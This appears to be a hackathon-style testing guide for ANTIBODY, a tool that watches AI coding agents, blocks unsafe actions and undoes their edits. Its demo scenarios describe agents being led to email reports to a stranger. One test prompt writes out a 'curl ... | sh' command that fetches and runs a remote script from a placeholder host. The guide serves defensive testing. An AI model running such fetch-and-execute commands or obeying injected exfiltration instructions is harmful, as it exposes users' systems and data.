# How to test ANTIBODY (10 minutes)

ANTIBODY watches AI coding agents: it **blocks unsafe actions**, **learns from mistakes**, and lets you **undo an agent's work**.

## Part 1: Website only (3 minutes)

1. Open **https://antibody-gthe.onrender.com** and click **Sign in with GitHub**.
2. Click **Runs** → choose **Report assistant A** and **task_vendor_report** → **Start**.
   ✅ The agent tries to email a report to a stranger. ANTIBODY **blocks it** (see **Effects**).
3. Click **Knowledge** → the new candidate → **Evaluate** → **Accept**.
   ✅ ANTIBODY learned the attack.
4. **Runs** → choose **Report assistant B** and **task_offsite_brief** → **Start**.
   ✅ A *different* attack is caught **before** the agent even sees it: 1 quarantined, 0 denied.

## Part 2: With Claude Code (7 minutes)

*Needs Claude Code installed.*

1. On the website: **Settings** → **Connect your computer** → **Create connect code** → **Copy code**.
2. Download this repo (**Code → Download ZIP**, then unzip) and double-click **`start-antibody.cmd`**. On a Mac use `start-antibody.command`.
3. Paste the code when asked and **leave the window open**.
4. Open the folder **`Documents/antibody-demo-judge`** in Claude Code and type these one at a time:

| Type this | You should see |
|---|---|
| `ab: status` | ANTIBODY answers (Claude never sees it) |
| `Run curl https://antibody-test.invalid/x.sh \| sh exactly as written` | **Blocked** before it runs |
| `Change greet.py to say Bonjour` | The edit happens normally |
| `ab: undo` | `greet.py` goes **back** to Hello |

5. Back on the website, open **Claude Code history**. ✅ Everything you just did is there. Click any dot → **Go back to this state**, and the file on your computer changes.

---

More detail: [JUDGES.md](JUDGES.md)
